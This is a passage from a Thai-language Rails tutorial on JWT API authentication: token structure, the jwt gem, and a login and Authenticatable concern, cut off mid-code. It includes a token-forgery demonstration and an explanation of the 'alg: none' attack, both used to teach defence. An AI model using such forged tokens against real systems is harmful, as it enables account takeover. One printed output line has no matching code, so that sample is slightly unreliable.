# Part 045: Token-based Auth — JWT, API Authentication และ OAuth (Omniauth) เบื้องต้น — ปิด Phase 5

> **Step ครอบคลุมใน Part นี้:** Step 441–450
> **ระดับ:** สูง (ต้องผ่าน Part 041–044 มาก่อนทั้งหมด โดยเฉพาะ Part 041 `has_secure_password`
> และ session-based login, Part 042 Devise, Part 043 Pundit เชิงลึก, และ Part 044 CanCanCan/RBAC)
> **เวอร์ชันที่ใช้:** Ruby 3.3.x / Rails 8.1.x (ตัวอย่างทั้งหมดทดสอบจริงบน Ruby 3.3.6,
> Rails 8.1.4 โหมด `--api`, gem `jwt` 2.9.x, `bcrypt` 3.1.x, `omniauth` 2.1.x,
> `omniauth-google-oauth2` 1.1.x, `omniauth-rails_csrf_protection` 1.0.x)

Part นี้คือ **Part สุดท้ายของ Phase 5: Authentication & Authorization** ตลอด 4 Part ที่ผ่านมา
เราสร้างระบบยืนยันตัวตนและสิทธิ์การเข้าถึงแบบ **ผูกกับ session ของ browser** มาโดยตลอด —
Part 041 เขียน login/logout เองด้วยมือผ่าน `has_secure_password` และ `session[:user_id]`,
Part 042 เปลี่ยนมาใช้ **Devise** ที่ทำสิ่งเดียวกันให้แบบสำเร็จรูปพร้อมฟีเจอร์ระดับ production
(confirmable, lockable), Part 043 เพิ่มชั้น **authorization** ด้วย **Pundit** (ตอบคำถามว่า
"ผู้ใช้คนนี้ *ทำ* สิ่งนี้ได้ไหม"), และ Part 044 นำเสนอทางเลือกด้วย **CanCanCan** พร้อมออกแบบ
ระบบ **Role-based Access Control (RBAC)** เต็มรูปแบบ

ทุก Part ที่ผ่านมามีสมมติฐานร่วมกันอย่างหนึ่งที่ไม่เคยพูดตรงๆ: **ผู้ใช้เปิดเว็บผ่าน browser
เดียวกันตลอดทั้ง session** — login หน้าหนึ่ง แล้วคลิกลิงก์ไปหน้าอื่นๆ ต่อโดย browser จัดการ
ส่ง cookie (ที่มี session ID) แนบไปกับทุก request ให้อัตโนมัติ Part นี้เราจะเจาะคำถามที่ตามมา
ทันทีที่ระบบของเราต้องเปิดให้ **แอปมือถือ**, **Single Page Application (SPA) ที่อยู่คนละโดเมน**,
หรือ **บริการอื่นเรียกเข้ามาแบบ machine-to-machine** ใช้งาน — สิ่งเหล่านี้ไม่มี "cookie jar"
แบบ browser ให้พึ่งพา จึงต้องมีกลไกยืนยันตัวตนแบบใหม่ที่เรียกว่า **Token-based Authentication**
โดยตัวละครหลักคือ **JWT (JSON Web Token)** และปิดท้ายด้วยการทำความเข้าใจ **OAuth 2.0** ผ่าน
gem **Omniauth** สำหรับฟีเจอร์ "Sign in with Google" ที่พบได้แทบทุกเว็บยุคนี้

## สารบัญของ Part นี้

- Step 441: ทำไม Session-based Auth ไม่เหมาะกับ API/Mobile Client — Cookie Jar, CORS, Stateless
- Step 442: JWT คืออะไรจริงๆ — `header.payload.signature`, Base64URL และทำไมมันไม่ใช่การเข้ารหัส
- Step 443: ใช้ gem `jwt` เข้ารหัส/ถอดรหัส Token จริงด้วย `JWT.encode`/`JWT.decode`
- Step 444: สร้าง API Authentication Flow ขั้นต่ำ — `POST /login`, `Authenticatable` Concern,
  `rescue_from JWT::DecodeError`
- Step 445: Token Expiration (`exp`) และ Refresh Token Pattern — Access Token สั้น + Refresh
  Token ยาว
- Step 446: เก็บ Refresh Token ไว้ที่ไหนดี — httpOnly Cookie vs `localStorage` และปัญหา XSS
- Step 447: การ Revoke JWT — ปัญหาคลาสสิกที่แก้ไม่ได้ตรงๆ และวิธีบรรเทาที่ใช้จริง
- Step 448: OAuth 2.0 คืออะไรจริงๆ — Sequence เต็มรูปแบบก่อนแตะ Omniauth
- Step 449: "Sign in with Google" ด้วย `omniauth` + `omniauth-google-oauth2` และ
  `OmniauthCallbacksController`
- Step 450: Security Checklist สำหรับ API/Token Auth + แบบฝึกหัดปิดท้าย Phase 5

---

## Step 441: ทำไม Session-based Auth ไม่เหมาะกับ API/Mobile Client — Cookie Jar, CORS, Stateless

### ทบทวนกลไก Session-based Auth ที่เรียนมาใน Part 041–044

จำกลไกจาก Part 041 ได้ไหม — ตอน login สำเร็จ เราเขียน:

```ruby
# ทบทวนจาก Part 041
session[:user_id] = user.id
```

Rails เก็บ `session` ไว้ในรูปแบบ **cookie ที่เข้ารหัสไว้** (`ActionDispatch::Session::CookieStore`
เป็น default) ส่งกลับไปให้ browser ผ่าน HTTP header `Set-Cookie` แล้ว **browser จะแนบ cookie
เดิมนี้กลับมาให้เองอัตโนมัติทุกครั้ง** ที่ยิง request ไปยังโดเมนเดียวกัน — นี่คือกลไกที่เรียกว่า
**cookie jar**: browser มี "กระเป๋า" เก็บ cookie ของแต่ละเว็บไซต์แยกกันไว้ และหยิบออกมาแนบให้
อัตโนมัติตาม domain/path ที่ cookie นั้นถูกตั้งไว้

กลไกนี้ทำงานได้สมบูรณ์แบบเมื่อ **ทุกอย่างเป็น browser คุยกับ Rails server เดียวกัน** แต่จะเริ่ม
มีปัญหาทันทีที่สถาปัตยกรรมระบบเปลี่ยนไปเป็นแบบใดแบบหนึ่งต่อไปนี้ ซึ่งพบบ่อยมากในระบบยุคปัจจุบัน:

### ปัญหาที่ 1: ไม่มี Cookie Jar ให้พึ่งพา

**แอปมือถือ (iOS/Android)** ไม่ใช่ browser — มันเป็นโปรแกรมที่ยิง HTTP request ไปหา backend
โดยตรงผ่าน HTTP client library (เช่น `URLSession` บน iOS, `OkHttp` บน Android) ไม่มีแนวคิด
"cookie jar ของเว็บไซต์" ให้ browser จัดการให้อัตโนมัติเหมือนกัน แม้จะ *เขียนโค้ดจัดการ cookie
เองได้* แต่นั่นคือภาระเพิ่มที่ backend ควรออกแบบไม่ให้ client ต้องแบกรับตั้งแต่แรก

เช่นเดียวกันกับ **CLI tool, script อัตโนมัติ, หรือ backend service อีกตัวหนึ่งที่เรียก API ของ
เรา** (server-to-server / machine-to-machine) — ทั้งหมดนี้ "ไม่มี browser" อยู่เบื้องหลังเลย

### ปัญหาที่ 2: CORS (Cross-Origin Resource Sharing) เมื่อ Frontend อยู่คนละโดเมน

สมมติสถาปัตยกรรมยุคใหม่ที่พบบ่อยมาก: **frontend เป็น SPA (React/Vue) วางบน
`https://app.example.com`** ส่วน **backend Rails API วางบน `https://api.example.com`** — สอง
โดเมนนี้แม้จะเป็นเจ้าของเดียวกัน แต่ browser มองว่าเป็นคนละ **origin** (origin = protocol +
domain + port) ตามนโยบาย **Same-Origin Policy**

Cookie ที่ตั้งค่าจาก `api.example.com` จะไม่ถูกส่งไปแนบกับ request ที่ frontend ยิงข้าม origin
โดยอัตโนมัติ **เว้นแต่** จะตั้งค่า cookie ให้เป็น `SameSite=None; Secure` และฝั่ง server ต้อง
ตอบ CORS header `Access-Control-Allow-Credentials: true` คู่กับ `Access-Control-Allow-Origin`
ที่ระบุโดเมนแบบเจาะจง (ใช้ `*` ไม่ได้เมื่อต้องส่ง credentials) พร้อมทั้งฝั่ง client (JavaScript
`fetch`) ต้องตั้ง `credentials: "include"` ทุกครั้งด้วย — ต้องตั้งค่าถูกต้องพร้อมกันหลายจุด
ทั้ง frontend/backend/browser ถึงจะทำงานได้ และยังเสี่ยงเรื่อง CSRF มากขึ้นเมื่อ cookie ถูกส่ง
ข้าม origin แบบกว้าง (`SameSite=None` ปิดการป้องกัน CSRF ที่ `SameSite=Lax`/`Strict` ให้มาฟรี)

> **preview:** เรื่อง `SameSite`, CSRF, และ CORS แบบเจาะลึกจะกลับมาอีกครั้งใน **Part 079–081
> (Phase 13: Security)** ตอนนี้แค่เข้าใจว่า cookie-based auth ข้าม origin ทำได้ แต่ "ยุ่งยาก
> และเสี่ยง" กว่าที่ควรจะเป็น

### ปัญหาที่ 3: Stateful Session ขัดกับการ Scale แบบ Stateless

Session ที่เก็บด้วย `CookieStore` เข้ารหัสค่าไว้ในตัว cookie เอง (ไม่ต้องมี state ฝั่ง server)
จึง scale แนวนอนได้ไม่ยาก แต่ระบบจำนวนมากเลือกเก็บ session ไว้ฝั่ง server แทน (เช่น
`ActiveRecord::SessionStore` หรือเก็บใน Redis) เพื่อควบคุม/เพิกถอน session ได้ทันที — พอเป็น
แบบนั้น server ทุกตัวใน load balancer ต้องเข้าถึง session store ตัวเดียวกันได้ (shared session
store) ซึ่งเพิ่มความซับซ้อนของ infrastructure และเป็นจุดคอขวด (bottleneck) จุดหนึ่งของระบบ

Token-based authentication (โดยเฉพาะ JWT ที่จะเรียนใน Step ถัดไป) แก้ปัญหานี้ได้เพราะ
**server ไม่ต้องเก็บ state อะไรเกี่ยวกับ token เลย** — ตรวจสอบ signature ผ่านก็เชื่อได้ทันที
ไม่ต้อง query ฐานข้อมูล/cache ใดๆ (ข้อดีข้อนี้แลกมาด้วยปัญหาเรื่อง revoke ที่จะเจอใน Step 447)

### ตารางเทียบ Session-based vs Token-based Authentication

| ประเด็น | Session-based (cookie) | Token-based (JWT) |
|---|---|---|
| ใครถือ state | Server (หรือ cookie ที่เข้ารหัส) | ไม่มี state ฝั่ง server (โดยทั่วไป) |
| ใครส่งอัตโนมัติ | Browser (cookie jar) | ไม่มีใครส่งให้ฟรี — client (JS/mobile) ต้องแนบ
  header เอง |
| เหมาะกับ | เว็บแอปแบบดั้งเดิม (server render HTML), frontend/backend origin เดียวกัน | Mobile app,
  SPA คนละโดเมน, public API, microservices |
| CSRF | ต้องป้องกันด้วย CSRF token (`protect_from_forgery`) | ไม่จำเป็น (ดูเหตุผลใน Step 450) |
| Revoke ทันที | ทำได้ง่าย (ลบ session ฝั่ง server) | ทำได้ยาก (ดู Step 447) |
| Scale แนวนอน | ต้องมี shared session store ถ้าเก็บ state ฝั่ง server | Stateless โดยธรรมชาติ |

> **ข้อควรระวัง:** Token-based auth **ไม่ได้ดีกว่า session-based auth เสมอไป** มันคือเครื่องมือ
> คนละแบบสำหรับปัญหาคนละแบบ — เว็บแอปที่ frontend/backend อยู่ origin เดียวกันและ render HTML
> จาก server (แบบที่เรียนมาตลอด Phase 3–4) **ยังคงควรใช้ session-based auth ต่อไป** เพราะ Rails
> จัดการ CSRF protection และ cookie security ให้ค่อนข้างสมบูรณ์อยู่แล้ว Part นี้เจาะจงกรณีที่
> ระบบต้องเปิด API ให้ client ที่ไม่ใช่ browser ธรรมดาเข้าถึง

---

## Step 442: JWT คืออะไรจริงๆ — `header.payload.signature`, Base64URL และทำไมมันไม่ใช่การเข้ารหัส

**JWT (JSON Web Token)** ที่อ่านออกเสียงว่า "jot" คือมาตรฐานเปิด (RFC 7519) สำหรับสร้าง
**token ที่ตรวจสอบได้ว่าไม่ถูกปลอมแปลง (tamper-proof)** โดยไม่ต้อง query ฐานข้อมูลใดๆ —
เหมาะกับการใช้เป็น "บัตรผ่าน" ที่ client แนบมากับทุก request แทนการอาศัย cookie/session

### โครงสร้างจริงของ JWT: 3 ส่วนคั่นด้วยจุด (`.`)

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJleHAiOjE3OTA0MDQ3ODl9.48SSFic4vAUrhOMu83gij7sJjSMhNoM5MX9Nd164SWI
└──────── Header ────────┘└──────────────── Payload ─────────────────┘└──────────── Signature ────────────┘
```

JWT ประกอบด้วย 3 ส่วนเสมอ คั่นด้วยจุด `.`:

1. **Header** — บอกว่าใช้ algorithm อะไรเซ็นลายเซ็น (เช่น `HS256`) และประเภท token (`JWT`)
2. **Payload** — ข้อมูล "claims" ที่ต้องการส่งไปด้วย เช่น `user_id`, `exp` (เวลาหมดอายุ)
3. **Signature** — ลายเซ็นดิจิทัลที่คำนวณจาก header + payload + secret key เพื่อพิสูจน์ว่า
   ข้อมูลสองส่วนแรก **ไม่ถูกแก้ไข** ระหว่างทาง

แต่ละส่วนถูกเข้ารหัสด้วย **Base64URL** (คือ Base64 ธรรมดาแต่แทน `+`/`/` ด้วย `-`/`_` เพื่อให้
ใช้ใน URL ได้อย่างปลอดภัยโดยไม่ต้อง escape) — Base64URL **ไม่ใช่การเข้ารหัส (encryption)**
มันเป็นแค่การ **encode** ข้อมูลให้อยู่ในรูปแบบตัวอักษรที่ปลอดภัยสำหรับส่งผ่าน HTTP/URL เท่านั้น

### ทดลองถอดรหัส Header และ Payload ด้วยมือ — พิสูจน์ว่าใครก็อ่านได้

ทดลองรันจริงด้วย `python3` (หรือใช้ Ruby `Base64.urlsafe_decode64` ก็ได้ผลเหมือนกัน) ถอดรหัส
token ตัวอย่างข้างบนออกมาดู โดย**ไม่ใช้ secret key ใดๆ เลย**:

```bash
TOKEN="eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJleHAiOjE3OTA0MDQ3ODl9.48SSFic4vAUrhOMu83gij7sJjSMhNoM5MX9Nd164SWI"

python3 -c "
import base64
part = '$TOKEN'.split('.')[0]
part += '=' * (-len(part) % 4)   # base64 ต้องการความยาวหารด้วย 4 ลงตัว ต้องเติม padding เอง
print(base64.urlsafe_b64decode(part).decode())
"
```

ผลลัพธ์ที่ทดสอบรันจริง:

```
{"alg":"HS256"}
```

ถอด payload ด้วยวิธีเดียวกัน (เปลี่ยน `split('.')[0]` เป็น `split('.')[1]`):

```
{"user_id":1,"exp":1790404789}
```

**นี่คือประเด็นสำคัญที่สุดของ Step นี้ ต้องจำให้ขึ้นใจ:**

> **JWT ไม่ใช่การเข้ารหัส (encryption) มันคือการ "เซ็นชื่อกำกับ" (signing) เท่านั้น**
> ใครก็ตามที่มี token อยู่ในมือ **อ่าน payload ข้างในได้ทันทีโดยไม่ต้องรู้ secret key เลย**
> (แค่ base64-decode เฉยๆ อย่างที่เพิ่งทำไป) สิ่งที่ secret key ปกป้องไว้มีอย่างเดียวคือ
> **การป้องกันไม่ให้ใครปลอมแปลงหรือแก้ไขเนื้อหาแล้วสร้างลายเซ็นปลอมที่ผ่านการตรวจสอบได้**
>
> **ดังนั้นห้ามใส่ข้อมูลลับ (secret) ลงใน payload ของ JWT เด็ดขาด** เช่น รหัสผ่าน, เลขบัตร
> เครดิต, ข้อมูลส่วนตัวที่ละเอียดอ่อน, หรือ internal API key — ใส่ได้แค่ข้อมูลที่ "เปิดเผยได้"
> เช่น `user_id`, `role`, `email` (ถ้าไม่ใช่ข้อมูลอ่อนไหวเกินไป), เวลาหมดอายุ

### พิสูจน์ว่า Signature ป้องกันการปลอมแปลงได้จริง (ทดสอบจริง)

ทดลองแก้ payload ของ token เดิม (เปลี่ยน `user_id` จาก `1` เป็น `999`) โดยไม่รู้ secret key
แล้วลองถอดรหัสแบบตรวจสอบลายเซ็นด้วย gem `jwt` (รายละเอียดการใช้ gem นี้จะเรียนเต็มใน Step 443):

```ruby
require "jwt"

payload = { user_id: 42, role: "admin" }
secret = "my$ecretKey"
token = JWT.encode(payload, secret, "HS256")
puts "Token: #{token}"

# ปลอมแปลง payload ตรงกลาง token โดยแทนที่ด้วย base64 ของ {"user_id":999,"role":"admin"}
tampered = token.sub(/\.[^.]+\./, ".eyJ1c2VyX2lkIjo5OTksInJvbGUiOiJhZG1pbiJ9.")

begin
  JWT.decode(tampered, secret, true, algorithm: "HS256")
  puts "TAMPERED TOKEN ACCEPTED (ไม่ควรเกิดขึ้น!)"
rescue JWT::VerificationError => e
  puts "Tampered token rejected correctly: #{e.class}: #{e.message}"
end
```

ผลลัพธ์ที่ทดสอบรันจริง:

```
Token: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0Miwicm9sZSI6ImFkbWluIn0.ueu133wKgu0NVeYb0St4IdEsz_FDOCxAB6ZTreKL4tA
Decoded: [{"user_id"=>42, "role"=>"admin"}, {"alg"=>"HS256"}]
Tampered token rejected correctly: JWT::VerificationError: Signature verification failed
```

เพราะ signature ถูกคำนวณจาก header + payload **ตัวเดิมทั้งหมด** — เมื่อแก้ payload แม้แต่
ตัวอักษรเดียว ผลลัพธ์การคำนวณ HMAC จะต่างไปจากลายเซ็นเดิมที่แนบมาทันที ทำให้ตรวจจับการปลอมแปลง
ได้เสมอ **ตราบใดที่ secret key ไม่รั่วไหล**

### Symmetric (HS256) vs Asymmetric (RS256) Algorithm

- **HS256** (HMAC + SHA-256) — ใช้ **secret key ตัวเดียว** ทั้งเซ็นและตรวจสอบ เหมาะกับกรณีที่
  ฝ่าย "ออก token" และฝ่าย "ตรวจสอบ token" เป็นระบบเดียวกัน (เช่น Rails API ตัวเดียวที่ออกและ
  ตรวจสอบ token ของตัวเอง) — เป็นสิ่งที่ Part นี้ใช้ตลอด เพราะเรียบง่ายและเพียงพอสำหรับ
  สถาปัตยกรรมส่วนใหญ่ที่กำลังเรียน
- **RS256** (RSA + SHA-256) — ใช้ **คู่ private/public key** ฝ่ายออก token เซ็นด้วย
  private key (เก็บเป็นความลับ) ส่วนฝ่ายตรวจสอบ token ใช้แค่ **public key** (เผยแพร่ได้อย่าง
  ปลอดภัย) ในการตรวจสอบ — เหมาะกับสถาปัตยกรรม **microservices** ที่มีหลายบริการต้องตรวจสอบ
  token แต่ไม่ควรมีสิทธิ์ *ออก* token ปลอมได้ทุกตัว (ถ้าใช้ HS256 แล้วแจก secret เดียวกันให้ทุก
  service ต้องเก็บ secret ปลอดภัยเท่ากันหมด service ไหนรั่วก็ทำให้ทั้งระบบเสี่ยง)

> **preview:** สถาปัตยกรรม microservices แบบเต็มรูปแบบและการเลือก HS256/RS256 อย่างเหมาะสมจะ
> กลับมาเจาะลึกอีกครั้งใน **Part 086 (เฟส 14: Microservices กับ Rails)**

---

## Step 443: ใช้ gem `jwt` เข้ารหัส/ถอดรหัส Token จริงด้วย `JWT.encode`/`JWT.decode`

### ติดตั้ง gem

```ruby
# Gemfile
gem "jwt", "~> 2.9"
```

```bash
bundle install
```

### `JWT.encode` และ `JWT.decode` — API พื้นฐานที่สุด

ทดสอบใน `bin/rails runner` หรือ `bin/rails console` ของโปรเจกต์ Rails ใดก็ได้ที่ติดตั้ง gem
`jwt` แล้ว (ตัวอย่างนี้ทดสอบรันจริงแล้ว):

```ruby
require "jwt"

payload = { user_id: 42, role: "admin" }
secret = "my$ecretKey"

# เข้ารหัส (สร้าง token)
token = JWT.encode(payload, secret, "HS256")
puts token
# => eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0Miwicm9sZSI6ImFkbWluIn0.ueu133wKgu0NVeYb0St4IdEsz_FDOCxAB6ZTreKL4tA

# ถอดรหัส (ตรวจสอบลายเซ็นด้วย argument ที่ 3 = true แล้วถอดข้อมูลกลับมา)
decoded = JWT.decode(token, secret, true, algorithm: "HS256")
puts decoded.inspect
# => [{"user_id"=>42, "role"=>"admin"}, {"alg"=>"HS256"}]
```

**อธิบาย:**

- `JWT.encode(payload, secret, algorithm)` รับ 3 argument: Hash ของข้อมูลที่จะใส่, secret key
  (String), และชื่อ algorithm (String) — คืนค่าเป็น token แบบ String พร้อมใช้งานทันที
- `JWT.decode(token, secret, verify, options)` คืนค่าเป็น **Array 2 ตัว**:
  `[payload_hash, header_hash]` — เหตุผลที่คืนเป็น Array ไม่ใช่ Hash เดียว เพราะบางครั้ง
  อยากอ่านข้อมูลจาก header ด้วย (เช่น `alg` ที่ใช้จริง) แต่ในทางปฏิบัติส่วนใหญ่สนใจแค่ตัวแรก
  จึงมักเขียน `JWT.decode(...)[0]` เพื่อดึงเฉพาะ payload
- **argument ตัวที่ 3 (`true`)** คือค่า `verify` — ถ้าเป็น `true` gem จะตรวจสอบ signature ให้
  อัตโนมัติ (raise `JWT::VerificationError` ถ้าไม่ตรง) **ควรเป็น `true` เสมอในโค้ด production**
  (การส่ง `false` เท่ากับปิดการตรวจสอบลายเซ็นทั้งหมด อ่าน payload ได้แต่ไม่รู้ว่าถูกปลอมแปลง
  มาหรือไม่ — มีประโยชน์เฉพาะตอน debug เท่านั้น)
- `algorithm:` **ต้องระบุตอน decode เสมอ** และควรตรงกับตอน encode ให้ชัดเจน — ถ้าไม่ระบุเลย
  หรือรับ algorithm จาก header ของ token เอง (`{}` ไม่ระบุ options) จะเปิดช่องให้เกิดช่องโหว่
  ที่เรียกว่า **"alg: none" attack** (ผู้โจมตีปลอมแปลง header ให้ `alg` เป็น `"none"` ซึ่งบาง
  library รุ่นเก่ายอมรับ token ที่ไม่มีลายเซ็นเลย) — gem `jwt` เวอร์ชันปัจจุบันป้องกันปัญหานี้
  ให้แล้วโดย default แต่การระบุ `algorithm:` ชัดเจนเสมอคือ defensive coding ที่ควรทำเป็นนิสัย

### เมื่อ Token หมดอายุหรือถูกปลอมแปลง — Exception ที่ต้องรู้จัก

| Exception | เกิดขึ้นเมื่อ |
|---|---|
| `JWT::DecodeError` | Base class ของ error ทั้งหมดที่เกี่ยวกับการถอดรหัส JWT — `rescue`
  ตัวนี้ตัวเดียวครอบคลุมเกือบทุกกรณี |
| `JWT::ExpiredSignature` | Token หมดอายุแล้ว (ตรวจจาก claim `exp` โดยอัตโนมัติ ถ้ามี) —
  เป็น subclass ของ `JWT::DecodeError` |
| `JWT::VerificationError` | Signature ไม่ตรงกับข้อมูล (ถูกปลอมแปลง หรือ secret ผิด) — เป็น
  subclass ของ `JWT::DecodeError` เช่นกัน |
| `JWT::IncorrectAlgorithm` | Algorithm ใน header ของ token ไม่ตรงกับที่ระบุตอน decode |

> **แนวคิดสำคัญ:** เนื่องจาก `ExpiredSignature` และ `VerificationError` ล้วนสืบทอดจาก
> `DecodeError` (pattern เดียวกับที่ Part 011 สอนเรื่อง custom exception hierarchy) การเขียน
> `rescue JWT::DecodeError` ตัวเดียวจะดักได้ทุกกรณีที่ token มีปัญหา — แต่ถ้าต้องการแยกข้อความ
> แจ้งเตือนให้ผู้ใช้ทราบว่า "หมดอายุ" ต่างจาก "token ผิด" (ซึ่งเป็น UX ที่ดีกว่า) ให้ `rescue`
> `ExpiredSignature` แยกไว้ **ก่อน** `DecodeError` เสมอ (Ruby ไล่ตรวจ `rescue` ตามลำดับบนลงล่าง
> ทบทวนจาก Part 011 Step 104)

---

## Step 444: สร้าง API Authentication Flow ขั้นต่ำ — `POST /login`, `Authenticatable` Concern, `rescue_from JWT::DecodeError`

ถึงเวลาประกอบทุกอย่างเป็นระบบ authentication แบบ API จริง สร้างโปรเจกต์ Rails ใหม่ในโหมด
`--api` (เหมาะกับ backend ที่ไม่ render HTML เลย เสิร์ฟแต่ JSON):

```bash
rails new jwt_demo --api -d sqlite3
cd jwt_demo
```

เพิ่ม gem ที่จำเป็นใน `Gemfile` (Rails `--api` มี `gem "bcrypt"` comment ไว้ให้แล้ว แค่เอา `#`
ออก):

```ruby
# Gemfile
gem "bcrypt", "~> 3.1.7"   # สำหรับ has_secure_password (เอา # ออกจากบรรทัดที่ Rails generate ไว้ให้)
gem "jwt", "~> 2.9"
```

```bash
bundle install
bin/rails g model User email:string:uniq password_digest:string
bin/rails db:migrate
```

### `app/models/user.rb`

```ruby
class User < ApplicationRecord
  has_secure_password

  validates :email, presence: true, uniqueness: true
end
```

**ทบทวนจาก Part 041:** `has_secure_password` เพิ่ม `password`/`password_confirmation` เป็น
virtual attribute, hash รหัสผ่านด้วย bcrypt เก็บลง `password_digest`, และเพิ่ม method
`authenticate(raw_password)` ที่คืน `user` ถ้ารหัสผ่านตรง หรือ `false` ถ้าไม่ตรง — กลไกนี้
**เหมือนกันเป๊ะ** ไม่ว่าจะใช้กับ session-based auth หรือ token-based auth เพราะมันตอบคำถาม
"รหัสผ่านนี้ถูกไหม" คนละเรื่องกับ "หลังจากยืนยันแล้ว จะออกอะไรให้ client ถือไว้"

### `app/lib/json_web_token.rb` — ห่อหุ้ม `JWT.encode`/`JWT.decode` ไว้ในที่เดียว

ไฟล์ใต้ `app/lib/` ถูก autoload โดย Zeitwerk เหมือนไฟล์ใน `app/models`, `app/controllers`
(ทบทวนกลไก Zeitwerk จาก Part 021) — เราสร้าง class กลางไว้ห่อหุ้ม logic ของ JWT ทั้งหมด
เพื่อไม่ให้ทุก controller ต้อง `require "jwt"` และเขียน `secret`/`algorithm` ซ้ำๆ กันเอง
(หลักการ **DRY** ที่เรียนมาตั้งแต่ Part 001):

```ruby
# app/lib/json_web_token.rb
require "jwt"

class JsonWebToken
  ALGORITHM = "HS256"

  def self.encode(payload, exp: 15.minutes.from_now)
    payload = payload.dup
    payload[:exp] = exp.to_i
    payload[:iat] = Time.now.to_i # "issued at" — เวลาที่ออก token กันไม่ให้ token ที่มี
                                  # payload เหมือนกันทุกตัวออกมาเหมือนกันเป๊ะ และช่วย debug ได้
    secret = Rails.application.credentials.jwt_secret || Rails.application.secret_key_base
    JWT.encode(payload, secret, ALGORITHM)
  end

  def self.decode(token)
    secret = Rails.application.credentials.jwt_secret || Rails.application.secret_key_base
    decoded = JWT.decode(token, secret, true, algorithm: ALGORITHM)[0]
    ActiveSupport::HashWithIndifferentAccess.new(decoded)
  end
end
```

**อธิบาย:**

- `exp: 15.minutes.from_now` เป็น keyword argument พร้อมค่า default — ทบทวน default argument
  จาก Part 007 — ทำให้เรียก `JsonWebToken.encode(payload)` เฉยๆ ได้ token อายุ 15 นาทีทันที
  โดยไม่ต้องระบุ `exp` เอง แต่ยังเปิดช่องให้ override ได้เมื่อจำเป็น (จะใช้จริงตอนสร้าง
  expired token สำหรับทดสอบใน Step 445)
- `payload[:exp] = exp.to_i` — gem `jwt` กำหนดว่า claim `exp` ต้องเป็น **Unix timestamp
  (จำนวนเต็ม วินาทีนับจาก 1 Jan 1970)** ไม่ใช่ object `Time`/`ActiveSupport::TimeWithZone`
  ตรงๆ จึงต้อง `.to_i` แปลงก่อนเสมอ — ถ้าลืมแปลง gem จะไม่ error ตอน encode แต่ตอน decode จะ
  เปรียบเทียบเวลาผิดพลาดเงียบๆ (silent bug ที่พบบ่อยเวลาใช้ gem นี้ครั้งแรก)
- `Rails.application.credentials.jwt_secret || Rails.application.secret_key_base` — ควรเก็บ
  JWT secret แยกจาก `secret_key_base` ของ Rails ใน production จริง (ผ่าน
  `bin/rails credentials:edit` เพิ่ม key `jwt_secret:`) แต่ตอนพัฒนา/ทดสอบเบื้องต้น ใช้
  `secret_key_base` ที่ Rails สร้างให้อัตโนมัติแทนได้ก่อน (`||` ทำหน้าที่เป็นค่า fallback
  ทบทวนจาก Part 001 Step 7)
- `ActiveSupport::HashWithIndifferentAccess.new(...)` ห่อผลลัพธ์ให้เรียกได้ทั้ง `payload[:user_id]`
  และ `payload["user_id"]` (ทบทวนแนวคิดนี้จาก Part 012 ตอนอ่าน JSON) เพราะ `JWT.decode` คืน
  Hash ที่ key เป็น **String** เสมอ (ผลจากการแปลงผ่าน JSON ภายใน) การห่อด้วย
  `HashWithIndifferentAccess` ทำให้โค้ดที่เรียกใช้ไม่ต้องจำว่าต้องใช้ Symbol หรือ String

### `app/controllers/concerns/authenticatable.rb` — ตรวจสอบ `Authorization: Bearer <token>`

```ruby
# app/controllers/concerns/authenticatable.rb
module Authenticatable
  extend ActiveSupport::Concern

  included do
    before_action :authenticate_request!
    attr_reader :current_user
  end

  private

  def authenticate_request!
    header = request.headers["Authorization"]
    token = header&.split(" ")&.last

    render json: { error: "ไม่พบ token กรุณา login ก่อนใช้งาน" }, status: :unauthorized and return if token.blank?

    payload = JsonWebToken.decode(token)
    @current_user = User.find(payload[:user_id])
  rescue JWT::ExpiredSignature
    render json: { error: "token หมดอายุแล้ว กรุณา login ใหม่" }, status: :unauthorized
  rescue JWT::DecodeError
    render json: { error: "token ไม่ถูกต้อง" }, status: :unauthorized
  rescue ActiveRecord::RecordNotFound
    render json: { error: "ไม่พบผู้ใช้งานนี้ในระบบ" }, status: :unauthorized
  end
end
```

**อธิบาย:**

- `ActiveSupport::Concern` คือสิ่งที่เรียนไปแล้วใน **Part 036** (การจัดโครงสร้างโมเดลขนาดใหญ่)
  — ที่นี่นำมาใช้กับ **Controller** แทน Model แต่หลักการเดียวกันเป๊ะ: `included do ... end`
  รันโค้ดในบริบทของ class ที่ `include Authenticatable` ตอนถูก include เข้าไป
- Header มาตรฐานของ token-based auth คือ `Authorization: Bearer <token>` — คำว่า "Bearer"
  (แปลว่า "ผู้ถือ") สื่อความหมายตรงตัวว่า **ใครก็ตามที่ "ถือ" token นี้ไว้ ถือว่าเป็นเจ้าของ
  สิทธิ์ทันที** ไม่มีการตรวจสอบเพิ่มเติมว่าคนที่ส่ง token มาคือเจ้าของจริงหรือไม่ — นี่คือ
  เหตุผลที่ต้องระวังเรื่องการรั่วไหลของ token อย่างมาก (จะกลับมาเน้นย้ำใน Step 450)
- `header&.split(" ")&.last` แยกคำว่า `"Bearer"` ออกจาก token จริง (`"Bearer eyJhbG..."` →
  `["Bearer", "eyJhbG..."]` → เอาตัวสุดท้าย) ใช้ safe navigation `&.` ทบทวนจาก Part 009
  ป้องกัน `NoMethodError` ถ้า header เป็น `nil` (ไม่มี `Authorization` มาเลย)
- `render ... and return if token.blank?` — รูปแบบ `and return` แทน `return if` แยกบรรทัดคือ
  สำนวนที่ใช้บ่อยมากใน Rails controller เพื่อหยุดการทำงานทันทีหลัง render (ป้องกัน
  `AbstractController::DoubleRenderError` ถ้าโค้ดด้านล่างพยายาม render ซ้ำ)
- **`rescue` เรียงลำดับจากเฉพาะเจาะจงไปกว้าง**: `JWT::ExpiredSignature` ต้องมาก่อน
  `JWT::DecodeError` เพราะเป็น subclass (ทบทวนจาก Step 443) ถ้าสลับลำดับ
  `JWT::DecodeError` จะดักจับ `ExpiredSignature` ไปก่อนเสมอ ทำให้ข้อความ "token หมดอายุ"
  ไม่มีวันแสดงออกมาได้เลย

### `app/controllers/sessions_controller.rb` — `POST /login`

```ruby
# app/controllers/sessions_controller.rb
class SessionsController < ApplicationController
  # ไม่ include Authenticatable เพราะการ login ต้องเปิดให้เรียกได้โดยไม่ต้องมี token มาก่อน

  def create
    user = User.find_by(email: params[:email])

    if user&.authenticate(params[:password])
